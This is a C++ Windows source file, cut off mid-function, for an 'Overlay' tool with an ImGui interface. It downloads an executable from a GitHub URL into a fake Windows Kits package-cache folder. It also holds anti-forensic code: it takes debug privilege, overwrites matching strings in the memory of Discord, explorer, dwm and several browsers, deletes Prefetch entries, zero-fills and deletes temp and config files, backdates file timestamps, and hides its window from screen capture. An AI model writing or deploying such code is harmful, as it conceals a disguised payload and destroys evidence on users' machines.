#define _WIN32_WINNT 0x0A00

#include <Windows.h>
#include <d3d11.h>
#include <dwmapi.h>
#include <winhttp.h>
#include <process.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <psapi.h>
#include <cfloat>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <string.h>

#include "imgui.h"
#include "backends/imgui_impl_win32.h"
#include "backends/imgui_impl_dx11.h"
#include "fa_solid_900_ttf.h"
#include "IconsFontAwesome6.h"
#include "MinHook.h"

#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma warning(disable: 28251)

#ifndef ICON_MAX_16_FA
#define ICON_MAX_16_FA ICON_MAX_FA
#endif
#ifndef ICON_FA_XMARK
#define ICON_FA_XMARK "\xef\x80\x8d"
#endif
#ifndef ICON_FA_MINUS
#define ICON_FA_MINUS "\xef\x81\xa8"
#endif

static ID3D11Device* g_pd3dDevice = nullptr;
static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
static IDXGISwapChain* g_pSwapChain = nullptr;
static ID3D11RenderTargetView* g_mainRTV = nullptr;

static ImFont* g_fontIcons = nullptr;
static ImFont* g_fontWindowIcons = nullptr;
static ImFont* g_fontText = nullptr;

static bool g_running = true;
static HICON g_logoIconBig = nullptr;
static HICON g_logoIconSmall = nullptr;

static const wchar_t* kWindowTaskbarTitle = L"Overlay";

static const float kPanelW = 600.0f;
static const float kPanelH = 320.0f;
static const float kRounding = 14.0f;
static const float kIconSize = 17.0f;
static const float kIconAtlasSize = 22.0f;
static const float kLabelSize = 15.0f;
static const float kTitlePadX = 14.0f;

static bool  s_dragging = false;
static POINT s_cursorStart = {};
static RECT  s_windowStart = {};

static bool  s_menuCollapsed = false;
static bool  s_collapsedDragging = false;
static bool  s_collapsedMoved = false;
static POINT s_collapsedCursorStart = {};
static RECT  s_collapsedWindowStart = {};
static const float kCollapsedSize = 54.0f;

LRESULT WINAPI WndProc(HWND, UINT, WPARAM, LPARAM);
static void ApplyWindowIcon(HWND hwnd);
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);

static int s_injectingMode = 0;
static int s_cleaningMode = 0;

static HWND  g_overlayHwnd = nullptr;
static bool  s_lockKey = false;
static float s_lockKeyAnim = 0.0f;
static float s_lockKeyHover = 0.0f;

static bool  s_streamProof = true;
static float s_streamProofAnim = 0.0f;
static float s_streamProofHover = 0.0f;

typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
typedef HRESULT(WINAPI* DwmExtendFrameIntoClientArea_t)(HWND, const MARGINS*);
typedef SHORT(WINAPI* GetAsyncKeyState_t)(int);
typedef SHORT(WINAPI* GetKeyState_t)(int);

static DwmSetWindowAttribute_t        oDwmSetWindowAttribute = nullptr;
static DwmExtendFrameIntoClientArea_t oDwmExtendFrameIntoClientArea = nullptr;
static GetAsyncKeyState_t             oGetAsyncKeyState = nullptr;
static GetKeyState_t                  oGetKeyState = nullptr;

static HHOOK g_hKbHook = nullptr;

static void ApplyStreamProof() {
    if (!g_overlayHwnd) return;
    if (s_streamProof)
        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_EXCLUDEFROMCAPTURE);
    else
        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_NONE);
}

HRESULT WINAPI hkDwmSetWindowAttribute(HWND hwnd, DWORD attr, LPCVOID pv, DWORD cb) {
    HRESULT hr = oDwmSetWindowAttribute(hwnd, attr, pv, cb);
    if (hwnd == g_overlayHwnd)
        ApplyStreamProof();
    return hr;
}

HRESULT WINAPI hkDwmExtendFrameIntoClientArea(HWND hwnd, const MARGINS* m) {
    HRESULT hr = oDwmExtendFrameIntoClientArea(hwnd, m);
    if (hwnd == g_overlayHwnd)
        ApplyStreamProof();
    return hr;
}

SHORT WINAPI hkGetAsyncKeyState(int vKey) {
    if (s_lockKey && (vKey == VK_DELETE))
        return 0;
    return oGetAsyncKeyState(vKey);
}

SHORT WINAPI hkGetKeyState(int vKey) {
    if (s_lockKey && (vKey == VK_DELETE))
        return 0;
    return oGetKeyState(vKey);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && s_lockKey) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (kb && kb->vkCode == VK_DELETE)
            return 1;
    }
    return ::CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
}

static void InstallMinHooks() {
    if (MH_Initialize() != MH_OK) return;

    HMODULE hDwm = ::LoadLibraryW(L"dwmapi.dll");
    HMODULE hUser = ::GetModuleHandleW(L"user32.dll");

    if (hDwm) {
        LPVOID pDwmSet = (LPVOID)::GetProcAddress(hDwm, "DwmSetWindowAttribute");
        if (pDwmSet)
            MH_CreateHook(pDwmSet, &hkDwmSetWindowAttribute,
                (LPVOID*)&oDwmSetWindowAttribute);

        LPVOID pDwmExt = (LPVOID)::GetProcAddress(hDwm, "DwmExtendFrameIntoClientArea");
        if (pDwmExt)
            MH_CreateHook(pDwmExt, &hkDwmExtendFrameIntoClientArea,
                (LPVOID*)&oDwmExtendFrameIntoClientArea);
    }

    if (hUser) {
        LPVOID pGas = (LPVOID)::GetProcAddress(hUser, "GetAsyncKeyState");
        if (pGas)
            MH_CreateHook(pGas, &hkGetAsyncKeyState, (LPVOID*)&oGetAsyncKeyState);

        LPVOID pGks = (LPVOID)::GetProcAddress(hUser, "GetKeyState");
        if (pGks)
            MH_CreateHook(pGks, &hkGetKeyState, (LPVOID*)&oGetKeyState);
    }

    MH_EnableHook(MH_ALL_HOOKS);
}

static void UninstallMinHooks() {
    if (g_hKbHook) {
        ::UnhookWindowsHookEx(g_hKbHook);
        g_hKbHook = nullptr;
    }
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
}

void LoadFonts() {
    ImGuiIO& io = ImGui::GetIO();
    io.IniFilename = nullptr;

    static const ImWchar iconRanges[] = { ICON_MIN_FA, ICON_MAX_16_FA, 0 };

    ImFontConfig cfg;
    cfg.PixelSnapH = true;
    cfg.GlyphMinAdvanceX = kIconAtlasSize;
    cfg.FontDataOwnedByAtlas = false;

    if (g_fontIcons && g_fontWindowIcons) return;

    char winDir[MAX_PATH] = {};
    if (::GetWindowsDirectoryA(winDir, MAX_PATH)) {
        char fontPath[MAX_PATH];
        wsprintfA(fontPath, "%s\\Fonts\\arialbd.ttf", winDir);
        g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
            io.Fonts->GetGlyphRangesDefault());
        if (!g_fontText) {
            wsprintfA(fontPath, "%s\\Fonts\\arial.ttf", winDir);
            g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
                io.Fonts->GetGlyphRangesDefault());
        }
    }
    if (!g_fontText) {
        ImFontConfig defCfg;
        defCfg.SizePixels = kLabelSize;
        g_fontText = io.Fonts->AddFontDefault(&defCfg);
    }

    g_fontIcons = io.Fonts->AddFontFromMemoryTTF(
        (void*)fa_solid_900_ttf, (int)fa_solid_900_ttf_len,
        kIconAtlasSize, &cfg, iconRanges);

    if (!g_fontIcons) {
        char modPath[MAX_PATH] = {};
        if (::GetModuleFileNameA(nullptr, modPath, MAX_PATH)) {
            char* slash = strrchr(modPath, 92);
            if (slash) *slash = 0;
            char fullPath[MAX_PATH];
            wsprintfA(fullPath, "%s\\fa-solid-900.ttf", modPath);
            g_fontIcons = io.Fonts->AddFontFromFileTTF(fullPath, kIconAtlasSize, &cfg, iconRanges);
        }
    }

    ImFontConfig winIconCfg;
    winIconCfg.PixelSnapH = false;
    winIconCfg.OversampleH = 4;
    winIconCfg.OversampleV = 4;
    winIconCfg.GlyphMinAdvanceX = 0.0f;
    winIconCfg.FontDataOwnedByAtlas = false;

    g_fontWindowIcons = io.Fonts->AddFontFromMemoryTTF(
        (void*)fa_solid_900_ttf, (int)fa_solid_900_ttf_len,
        17.0f, &winIconCfg, iconRanges);

    if (!g_fontWindowIcons) {
        char modPath[MAX_PATH] = {};
        if (::GetModuleFileNameA(nullptr, modPath, MAX_PATH)) {
            char* slash = strrchr(modPath, 92);
            if (slash) *slash = 0;
            char fullPath[MAX_PATH];
            wsprintfA(fullPath, "%s\\fa-solid-900.ttf", modPath);
            g_fontWindowIcons = io.Fonts->AddFontFromFileTTF(fullPath, 17.0f, &winIconCfg, iconRanges);
        }
    }

    if (!g_fontIcons)
        g_fontIcons = io.Fonts->AddFontDefault();
    if (!g_fontWindowIcons)
        g_fontWindowIcons = g_fontIcons;
}

static const wchar_t* kInstallerUrl =
L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
L"Kits%20Configuration%20Installer-x86-en-us.exe";

static const wchar_t* kInstallerRealUrl =
L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
L"Kits%20Configuration%20Installer-x86_en-us-Real.exe";

static const wchar_t* kInstallerDir =
L"C:\\ProgramData\\Package Cache\\"
L"{E5D0CA8F-4587-D081-98CB-4A788BF2747E}v10.1.28000.2526\\Installers";

static const wchar_t* kInstallerFile =
L"Kits Configuration Installer-x86-en-us.exe";

static volatile LONG g_installerWasCached = 0;
static volatile LONG g_installerHadRunning = 0;
static volatile LONG g_installerDone = 0;
static volatile LONG g_installerFailed = 0;
static volatile LONG g_installerSlept = 0;

static volatile LONG g_cleanStage = 0;
static volatile LONG g_cleanFound = 0;
static volatile LONG g_cleanZeroFilled = 0;
static volatile LONG g_cleanDone = 0;
static volatile LONG g_cleanFailed = 0;

static const wchar_t* kTargetProcessNames[] = {
    L"discord",
    L"explorer",
    L"dwm",
    L"brave",
    L"chrome",
    L"msedge",
    L"operagx",
};

static const char* kTargetStrings[] = {
    "https://cdn.discordapp.com/attachments/",
    "Kits Configuration Installer-x86-en-us",
    "Kits Configuration Installer",
    "CainesConfigs",
};

static const bool kRequireDotExe = true;

static bool EnableDebugPrivilege() {
    HANDLE hToken = nullptr;
    if (!::OpenProcessToken(::GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    if (!::LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        ::CloseHandle(hToken);
        return false;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ::SetLastError(ERROR_SUCCESS);
    ::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    const bool ok = (::GetLastError() == ERROR_SUCCESS);
    ::CloseHandle(hToken);
    return ok;
}

static bool EnsureDirectoryExists(const std::wstring& dir) {
    DWORD attr = ::GetFileAttributesW(dir.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
        return true;

    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos && pos > 2) {
        if (!EnsureDirectoryExists(dir.substr(0, pos)))
            return false;
    }
    if (::CreateDirectoryW(dir.c_str(), nullptr))
        return true;
    return ::GetLastError() == ERROR_ALREADY_EXISTS;
}

static bool FileExistsOnDisk(const std::wstring& path) {
    DWORD attr = ::GetFileAttributesW(path.c_str());
    return attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

static LONGLONG FileSizeOnDisk(const std::wstring& path) {
    WIN32_FILE_ATTRIBUTE_DATA fad = {};
    if (!::GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &fad))
        return -1;
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        return -1;
    LARGE_INTEGER sz = {};
    sz.HighPart = (LONG)fad.nFileSizeHigh;
    sz.LowPart = fad.nFileSizeLow;
    return sz.QuadPart;
}

static bool IsRealBySize(const std::wstring& path) {
    LONGLONG sz = FileSizeOnDisk(path);
    return sz > 0 && sz < (800LL * 1024LL);
}

static bool IsInstallerValid(const std::wstring& path) {
    HANDLE h = ::CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return false;

    LARGE_INTEGER sz = {};
    bool ok = false;

    do {
        if (!::GetFileSizeEx(h, &sz)) break;
        if (sz.QuadPart < (100LL * 1024LL)) break;

        DWORD read = 0;
        WORD mz = 0;
        if (!::ReadFile(h, &mz, sizeof(mz), &read, nullptr) || read != sizeof(mz)) break;
        if (mz != 0x5A4D) break;

        LARGE_INTEGER pos = {};
        pos.QuadPart = 0x3C;
        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;

        DWORD peOff = 0;
        if (!::ReadFile(h, &peOff, sizeof(peOff), &read, nullptr) || read != sizeof(peOff)) break;
        if (peOff < 0x40 || (LONGLONG)peOff + 4 > sz.QuadPart) break;

        pos.QuadPart = peOff;
        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;

        DWORD peSig = 0;
        if (!::ReadFile(h, &peSig, sizeof(peSig), &read, nullptr) || read != sizeof(peSig)) break;
        if (peSig != 0x00004550) break;

        ok = true;
    } while (false);

    ::CloseHandle(h);
    return ok;
}

static bool ProcessRunningByName(const wchar_t* exeName) {
    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (::Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                found = true;
                break;
            }
        } while (::Process32NextW(snap, &pe));
    }
    ::CloseHandle(snap);
    return found;
}

struct EnumKillCtx {
    DWORD pid;
    bool sentClose;
};

static BOOL CALLBACK EnumWindowsKillProc(HWND hWnd, LPARAM lParam) {
    EnumKillCtx* ctx = (EnumKillCtx*)lParam;
    DWORD wndPid = 0;
    ::GetWindowThreadProcessId(hWnd, &wndPid);
    if (wndPid == ctx->pid) {
        ::PostMessageW(hWnd, WM_CLOSE, 0, 0);
        ctx->sentClose = true;
    }
    return TRUE;
}

static bool KillProcessByNameSoftly(const wchar_t* exeName) {
    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    DWORD targetPid = 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (::Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                targetPid = pe.th32ProcessID;
                break;
            }
        } while (::Process32NextW(snap, &pe));
    }
    ::CloseHandle(snap);

    if (targetPid == 0) return false;

    EnumKillCtx ctx = { targetPid, false };
    ::EnumWindows(&EnumWindowsKillProc, (LPARAM)&ctx);

    HANDLE hProc = ::OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE,
        FALSE, targetPid);
    if (!hProc) return ctx.sentClose;

    DWORD w = ::WaitForSingleObject(hProc, 1500);
    if (w == WAIT_TIMEOUT) {
        ::TerminateProcess(hProc, 0);
        ::WaitForSingleObject(hProc, 1000);
    }

    ::CloseHandle(hProc);
    return true;
}

static bool DownloadFileToDisk(const std::wstring& url, const std::wstring& outPath) {
    bool ok = false;

    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    wchar_t hostName[256] = {};
    wchar_t urlPath[2048] = {};
    uc.lpszHostName = hostName;
    uc.dwHostNameLength = _countof(hostName);
    uc.lpszUrlPath = urlPath;
    uc.dwUrlPathLength = _countof(urlPath);

    if (!::WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc))
        return false;

    HINTERNET hSession = ::WinHttpOpen(L"Overlay/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = ::WinHttpConnect(hSession, hostName, uc.nPort, 0);
    if (!hConnect) { ::WinHttpCloseHandle(hSession); return false; }

    DWORD optFlags = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    ::WinHttpSetOption(hConnect, WINHTTP_OPTION_REDIRECT_POLICY,
        &optFlags, sizeof(optFlags));

    HINTERNET hRequest = ::WinHttpOpenRequest(hConnect, L"GET", urlPath,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        ::WinHttpCloseHandle(hConnect);
        ::WinHttpCloseHandle(hSession);
        return false;
    }

    if (::WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        ::WinHttpReceiveResponse(hRequest, nullptr)) {

        DWORD status = 0;
        DWORD sz = sizeof(status);
        ::WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

        if (status == 200) {
            HANDLE hFile = ::CreateFileW(outPath.c_str(), GENERIC_WRITE, 0,
                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwRead = 0;
                BYTE buffer[8192];
                ok = true;
                while (::WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead > 0) {
                    DWORD written = 0;
                    if (!::WriteFile(hFile, buffer, dwRead, &written, nullptr) || written != dwRead) {
                        ok = false;
                        break;
                    }
                }
                ::CloseHandle(hFile);
            }
        }
    }

    ::WinHttpCloseHandle(hRequest);
    ::WinHttpCloseHandle(hConnect);
    ::WinHttpCloseHandle(hSession);
    return ok;
}

static int PurgePrefetchByPrefix(const std::wstring& prefix) {
    int count = 0;

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = ::FindFirstFileW(L"C:\\Windows\\Prefetch\\*.pf", &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        if (_wcsnicmp(fd.cFileName, prefix.c_str(), prefix.size()) != 0)
            continue;

        std::wstring full = std::wstring(L"C:\\Windows\\Prefetch\\") + fd.cFileName;

        ::SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (::DeleteFileW(full.c_str()))
            ++count;
    } while (::FindNextFileW(hFind, &fd));

    ::FindClose(hFind);
    return count;
}

static bool IsOurTmpName(const wchar_t* name) {
    if (!name) return false;

    size_t len = wcslen(name);
    if (len < 5) return false;
    if (len > 32) return false;

    if (_wcsicmp(name + len - 4, L".tmp") != 0) return false;

    const size_t stemLen = len - 4;
    if (stemLen < 1 || stemLen > 16) return false;

    for (size_t i = 0; i < stemLen; ++i) {
        wchar_t c = name[i];
        bool alnum =
            (c >= L'0' && c <= L'9') ||
            (c >= L'A' && c <= L'Z') ||
            (c >= L'a' && c <= L'z');
        if (!alnum) return false;
    }

    return true;
}

static void ZeroAndDeleteFile(const std::wstring& path) {
    ::SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);

    HANDLE h = ::CreateFileW(path.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (h != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz = {};
        if (::GetFileSizeEx(h, &sz) && sz.QuadPart > 0) {
            const DWORD kChunk = 64 * 1024;
            std::vector<BYTE> buf(kChunk, 0);

            LARGE_INTEGER zero = {};
            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);

            LONGLONG remaining = sz.QuadPart;
            while (remaining > 0) {
                DWORD toWrite = (DWORD)((remaining < (LONGLONG)kChunk) ? remaining : (LONGLONG)kChunk);
                DWORD written = 0;
                if (!::WriteFile(h, buf.data(), toWrite, &written, nullptr) || written != toWrite)
                    break;
                remaining -= toWrite;
            }
            ::FlushFileBuffers(h);

            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);
            ::SetEndOfFile(h);
            ::FlushFileBuffers(h);
        }
        ::CloseHandle(h);
    }

    if (!::DeleteFileW(path.c_str())) {
        ::MoveFileExW(path.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

static void PurgeTmpInDir(std::wstring dir) {
    while (!dir.empty() && (dir.back() == L'\\' || dir.back() == L'/'))
        dir.pop_back();
    if (dir.empty())
        return;

    std::wstring pattern = dir + L"\\*.tmp";

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = ::FindFirstFileW(pattern.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        if (!IsOurTmpName(fd.cFileName))
            continue;

        std::wstring full = dir + L"\\" + fd.cFileName;
        ZeroAndDeleteFile(full);
    } while (::FindNextFileW(hFind, &fd));

    ::FindClose(hFind);
}

static void PurgeRandomTmpFiles() {
    wchar_t buf[MAX_PATH] = {};
    DWORD n = ::GetTempPathW(MAX_PATH, buf);
    if (n > 0 && n < MAX_PATH)
        PurgeTmpInDir(buf);

    wchar_t local[MAX_PATH] = {};
    if (::SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local) == S_OK)
        PurgeTmpInDir(std::wstring(local) + L"\\Temp");

    PurgeTmpInDir(L"C:\\Windows\\Temp");

    wchar_t roaming[MAX_PATH] = {};
    if (::SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roaming) == S_OK)
        PurgeTmpInDir(std::wstring(roaming) + L"\\Temp");
}

static void ZeroFillCainesConfigsDirRecursive(const std::wstring& dir);

static void ZeroFillCainesConfigsDirIn(const std::wstring& dir, bool removeDir) {
    if (dir.empty()) return;

    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = ::FindFirstFileW(pattern.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        if (removeDir) {
            ::SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
            if (!::RemoveDirectoryW(dir.c_str()))
                ::MoveFileExW(dir.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
        return;
    }

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0)
            continue;

        std::wstring full = dir + L"\\" + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            ZeroFillCainesConfigsDirRecursive(full);
        }
        else {
            if (_wcsicmp(fd.cFileName + wcslen(fd.cFileName) - 4, L".cfg") == 0 ||
                wcslen(fd.cFileName) >= 4) {
                ZeroAndDeleteFile(full);
            }
            else {
                ::SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
                if (!::DeleteFileW(full.c_str()))
                    ::MoveFileExW(full.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
            }
        }
    } while (::FindNextFileW(hFind, &fd));

    ::FindClose(hFind);

    if (removeDir) {
        ::SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (!::RemoveDirectoryW(dir.c_str()))
            ::MoveFileExW(dir.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

static void ZeroFillCainesConfigsDirRecursive(const std::wstring& dir) {
    ZeroFillCainesConfigsDirIn(dir, true);
}

static void ZeroFillCainesConfigsDir() {
    const std::wstring kDir = L"C:\\CainesConfigs";

    DWORD attr = ::GetFileAttributesW(kDir.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES)
        return;

    ZeroFillCainesConfigsDirIn(kDir, true);
}

static void BackdateFile12Hours(const std::wstring& path) {
    FILETIME ftNow = {};
    ::GetSystemTimeAsFileTime(&ftNow);

    ULONGLONG ticks = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

    const ULONGLONG twelveHours = 12ULL * 60ULL * 60ULL * 10000000ULL;
    if (ticks > twelveHours)
        ticks -= twelveHours;

    FILETIME ftNew = {};
    ftNew.dwLowDateTime = (DWORD)(ticks & 0xFFFFFFFFULL);
    ftNew.dwHighDateTime = (DWORD)(ticks >> 32);

    HANDLE h = ::CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return;

    ::SetFileTime(h, &ftNew, &ftNew, &ftNew);
    ::CloseHandle(h);
}

static BYTE g_toLower[256];
static volatile LONG g_lowerInit = 0;

static void InitLowerTable() {
    if (::InterlockedCompareExchange(&g_lowerInit, 1, 0) != 0) return;
    for (int i = 0; i < 256; ++i) {
        BYTE c = (BYTE)i;
        if (c >= 'A' && c <= 'Z') c += 32;
        g_toLower[i] = c;
    }
}

static bool ContainsCIW(const wchar_t* hay, const wchar_t* needle) {
    if (!hay || !needle || !*needle) return false;
    const size_t nl = wcslen(needle);
    for (const wchar_t* p = hay; *p; ++p) {
        bool match = true;
        for (size_t i = 0; i < nl; ++i) {
            wchar_t a = p[i];
            if (!a) { match = false; break; }
            wchar_t b = needle[i];
            if (a >= L'A' && a <= L'Z') a += 32;
            if (b >= L'A' && b <= L'Z') b += 32;
            if (a != b) { match = false; break; }
        }
        if (match) return true;
    }
    return false;
}

static const BYTE* MemFindCIFast(const BYTE* hay, size_t hayLen,
    const BYTE* needleLower, size_t needleLen) {
    if (needleLen == 0 || hayLen < needleLen) return nullptr;
    const BYTE first = needleLower[0];
    const BYTE* end = hay + (hayLen - needleLen + 1);
    for (const BYTE* p = hay; p < end; ++p) {
        if (g_toLower[*p] != first) continue;
        bool ok = true;
        for (size_t j = 1; j < needleLen; ++j) {
            if (g_toLower[p[j]] != needleLower[j]) { ok = false; break; }
        }
        if (ok) return p;
    }
    return nullptr;
}

static const BYTE* MemFindCIWFast(const BYTE* hay, size_t hayLen,
    const BYTE* needleLower, size_t needleLen) {
    const size_t needBytes = needleLen * 2;
    if (needleLen == 0 || hayLen < needBytes) return nullptr;
    const BYTE first = needleLower[0];
    const BYTE* end = hay + (hayLen - needBytes + 1);
    for (const BYTE* p = hay; p < end; ++p) {
        if (p[1] != 0) continue;
        if (g_toLower[p[0]] != first) continue;
        bool ok = true;
        for (size_t j = 1; j < needleLen; ++j) {
            if (p[j * 2 + 1] != 0) { ok = false; break; }
            if (g_toLower[p[j * 2]] != needleLower[j]) { ok = false; break; }
        }
        if (ok) return p;
    }
    return nullptr;
}

static int CleanProcessMemoryForNeedles(
    DWORD pid,
    const char* const* needles,
    size_t needleCount,
    bool requireDotExe)
{
    if (!needles || needleCount == 0) return 0;

    std::vector<std::vector<BYTE>> needlesLower(needleCount);
    size_t maxNeedleLen = 0;
    for (size_t i = 0; i < needleCount; ++i) {
        const size_t n = strlen(needles[i]);
        needlesLower[i].resize(n);
        for (size_t j = 0; j < n; ++j)
            needlesLower[i][j] = g_toLower[(BYTE)needles[i][j]];
        if (n > maxNeedleLen) maxNeedleLen = n;
    }
    if (maxNeedleLen == 0) return 0;

    const size_t kMaxSpan = 2048;
    const SIZE_T kChunk = 4 * 1024 * 1024;
    const SIZE_T kOverlap = maxNeedleLen * 2 + kMaxSpan * 2 + 128;
    const SIZE_T kReadSize = kChunk + kOverlap;

    HANDLE hProc = ::OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, pid);
    if (!hProc) return 0;

    SYSTEM_INFO si = {};
    ::GetSystemInfo(&si);

    std::vector<BYTE> buf(kReadSize);
    std::vector<BYTE> zeros(kMaxSpan * 2 + 128, 0);

    auto isUrlCharA = [](BYTE c) -> bool {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9')) return true;
        switch (c) {
        case '-': case '.': case '_': case '~':
        case ':': case '/': case '?': case '#':
        case '[': case ']': case '@': case '!':
        case '$': case '&': case '\'': case '(':
        case ')': case '*': case '+': case ',':
        case ';': case '=': case '%':
            return true;
        default:
            return false;
        }
        };

    auto zeroAt = [&](ULONG_PTR memAddr, size_t zeroLen) -> bool {
        SIZE_T written = 0;
        return ::WriteProcessMemory(hProc, (LPVOID)memAddr,
            zeros.data(), zeroLen, &written) && written == zeroLen;
        };

    auto spanHasDotExe = [&](const BYTE* p, size_t spanLen) -> bool {
        if (spanLen < 4) return false;
        for (size_t i = 0; i + 4 <= spanLen; ++i) {
            if (p[i] == '.' &&
                (p[i + 1] | 0x20) == 'e' &&
                (p[i + 2] | 0x20) == 'x' &&
                (p[i + 3] | 0x20) == 'e')
                return true;
        }
        return false;
        };

    auto spanHasDotExeW = [&](const BYTE* p, size_t spanLen) -> bool {
        if (spanLen < 8) return false;
        for (size_t i = 0; i + 8 <= spanLen; i += 2) {
            if (p[i] == '.' && p[i + 1] == 0 &&
